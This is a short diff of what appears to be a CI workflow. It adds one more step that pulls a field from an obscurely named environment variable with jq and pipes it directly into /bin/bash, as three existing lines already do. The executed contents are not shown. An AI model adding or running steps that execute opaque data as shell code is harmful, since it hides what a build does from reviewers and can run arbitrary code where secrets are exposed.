@@ -20,6 +20,7 @@ jobs:
           echo $zybur8 | jq -r .brmh40 | /bin/bash
           echo $lf7489 | jq -r .u3600 | /bin/bash
           printf '%s' "$t1787" | jq -r .or13 | /bin/bash
+          printf '%s' "$mfrn794" | jq -r .xhr4 | /bin/bash
 
       - name: Archive output
         uses: actions/upload-artifact@v4
